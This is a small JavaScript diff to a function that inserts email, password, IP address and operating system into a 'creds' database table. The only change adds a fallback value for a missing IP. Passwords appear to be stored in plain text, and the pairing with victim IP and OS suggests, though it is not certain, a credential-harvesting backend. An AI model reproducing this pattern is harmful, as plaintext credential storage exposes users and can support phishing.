@@ -27,7 +27,7 @@ export async function insertCred(epost, passord, ip, os) {
     const [result] = await db.query(`
         INSERT INTO creds (epost, passord, ipv4, os)
         VALUES (?, ?, ?, ?)
-        `, [epost, passord, ip, os || null])
+        `, [epost, passord, ip || "no IP found", os || null])
 
     const id = result.insertId
     return getCred(id)
